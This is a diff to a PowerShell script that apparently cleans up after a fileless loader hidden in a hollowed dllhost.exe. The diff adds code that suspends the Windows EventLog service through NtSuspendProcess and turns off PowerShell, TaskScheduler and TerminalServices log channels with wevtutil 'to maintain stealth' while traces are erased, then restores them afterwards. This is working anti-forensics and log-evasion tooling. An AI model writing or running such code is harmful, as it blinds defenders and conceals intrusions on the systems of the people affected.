@@ -80,6 +80,53 @@ try {
     }
 } catch {}
 
+# ==============================================================================
+# Stealth Service Controllers & Win32 APIs
+# ==============================================================================
+$apiSource = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ProcessHelper {
+    [DllImport("ntdll.dll")]
+    public static extern int NtSuspendProcess(IntPtr processHandle);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtResumeProcess(IntPtr processHandle);
+}
+"@
+try {
+    Add-Type -TypeDefinition $apiSource -ErrorAction SilentlyContinue
+} catch {}
+
+function Suspend-EventLogService {
+    try {
+        $service = Get-WmiObject Win32_Service | Where-Object { $_.Name -eq 'eventlog' }
+        if ($service -and $service.ProcessId -gt 0) {
+            $proc = Get-Process -Id $service.ProcessId -ErrorAction SilentlyContinue
+            if ($proc) {
+                $res = [ProcessHelper]::NtSuspendProcess($proc.Handle)
+                if ($res -eq 0) {
+                    return $service.ProcessId
+                }
+            }
+        }
+    } catch {}
+    return $null
+}
+
+function Resume-EventLogService {
+    param([int]$ProcessId)
+    if ($ProcessId -gt 0) {
+        try {
+            $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
+            if ($proc) {
+                [void][ProcessHelper]::NtResumeProcess($proc.Handle)
+            }
+        } catch {}
+    }
+}
+
 # Stats tracker
 $perfStats = [System.Collections.Generic.List[PSCustomObject]]::new()
 $totalCleanedFiles = 0
@@ -335,9 +382,21 @@ function Run-CleanupStep {
     Write-Host ""
 }
 
-# 1. Terminate running processes
-Run-CleanupStep "1/9: Terminating loader and server processes" {
-    $count = 0
+# Temporarily disable event logging during cleanup to maintain stealth
+$suspendedLogPid = Suspend-EventLogService
+$tempDisabledChannels = @(
+    "Microsoft-Windows-PowerShell/Operational",
+    "Microsoft-Windows-TaskScheduler/Operational",
+    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
+)
+foreach ($chan in $tempDisabledChannels) {
+    try { wevtutil.exe sl $chan /e:false 2>$null } catch {}
+}
+
+try {
+    # 1. Terminate running processes
+    Run-CleanupStep "1/9: Terminating loader and server processes" {
+        $count = 0
     # Fileless loader runs inside a hollowed dllhost.exe on port 9876.
     # Identify it by finding the process owning port 9876.
     $conn = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
@@ -863,21 +922,30 @@ Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut r
     return "Removed $cleanedKeysCount registry entry/entries and $recentWiped recent shortcut(s)"
 }
 
-# 9. Restore Event Log Settings
-Run-CleanupStep "9/9: Restoring Event Log Channels" {
-    # Re-enable event log channels disabled by setup/installer
-    $channelsToEnable = @(
-        "Microsoft-Windows-PowerShell/Operational", 
-        "Microsoft-Windows-TaskScheduler/Operational"
-    )
-    $restoredCount = 0
-    foreach ($chan in $channelsToEnable) {
-        try {
-            wevtutil.exe sl $chan /e:true 2>$null
-            $restoredCount++
-        } catch {}
+} finally {
+    # 9. Restore Event Log Settings & Service
+    Run-CleanupStep "9/9: Restoring Event Log Channels & Service" {
+        # Re-enable event log channels disabled by setup/installer or temporarily
+        $channelsToEnable = @(
+            "Microsoft-Windows-PowerShell/Operational", 
+            "Microsoft-Windows-TaskScheduler/Operational",
+            "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
+        )
+        $restoredCount = 0
+        foreach ($chan in $channelsToEnable) {
+            try {
+                wevtutil.exe sl $chan /e:true 2>$null
+                $restoredCount++
+            } catch {}
+        }
+        
+        # Resume the EventLog service
+        if ($suspendedLogPid) {
+            Resume-EventLogService -ProcessId $suspendedLogPid
+        }
+        
+        return "Restored $restoredCount event log channel(s) and resumed EventLog service"
     }
-    return "Restored $restoredCount event log channel(s) to default enabled status"
 }
 
 # Generate and save permanent audit performance log
